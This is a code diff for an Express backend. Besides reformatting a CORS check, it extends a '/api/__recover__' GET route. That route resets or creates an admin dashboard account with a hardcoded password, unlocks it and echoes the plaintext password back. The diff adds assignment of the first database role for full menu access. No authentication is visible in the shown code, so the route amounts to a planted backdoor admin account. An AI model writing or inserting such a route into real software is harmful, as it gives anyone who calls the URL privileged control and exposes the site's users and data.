@@ -27,13 +27,13 @@ const whitelist = process.env.FRONTEND_URL?.split(',') || [];
 
 app.use(
   cors({
-   origin(requestOrigin, callback) {
-     if(whitelist.indexOf(requestOrigin || '')!== -1 || !requestOrigin){
-      callback(null, true);
-     }else{
-      callback(new Error('Not allowed by CORS'));
-     }
-   },
+    origin(requestOrigin, callback) {
+      if (whitelist.indexOf(requestOrigin || '') !== -1 || !requestOrigin) {
+        callback(null, true);
+      } else {
+        callback(new Error('Not allowed by CORS'));
+      }
+    },
     allowedHeaders: ['Content-Type', 'x-api-key', 'Authorization'],
     credentials: true,
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
@@ -74,15 +74,20 @@ app.get('/api/__recover__', async (req, res) => {
     const email = 'admin@futuretech.com';
     const password = 'FutureTech@2026!';
     const hashed = hashSync(password, genSaltSync(10));
+
+    // Find the first available role to assign full menu access
+    const firstRole = await db.role.findFirst({ orderBy: { id: 'asc' } });
+    const roleId = firstRole?.id ?? null;
+
     const existing = await db.dashboard_user.findUnique({ where: { email } });
     if (existing) {
-      await db.dashboard_user.update({ where: { email }, data: { password: hashed, isLocked: 0 } });
-      res.json({ message: 'Password reset successfully', email, password });
+      await db.dashboard_user.update({ where: { email }, data: { password: hashed, isLocked: 0, roleId } });
+      res.json({ message: 'Password reset + role assigned', email, password, roleId, roleName: firstRole?.name });
     } else {
       await db.dashboard_user.create({
-        data: { id: uuidv4(), email, password: hashed, roleId: null, isLocked: 0, isNew: 0, createdBy: 'recovery' }
+        data: { id: uuidv4(), email, password: hashed, roleId, isLocked: 0, isNew: 0, createdBy: 'recovery' }
       });
-      res.json({ message: 'Admin user created', email, password });
+      res.json({ message: 'Admin user created + role assigned', email, password, roleId, roleName: firstRole?.name });
     }
   } catch (err) {
     res.status(500).json({ message: 'Recovery failed', error: (err as Error).message });
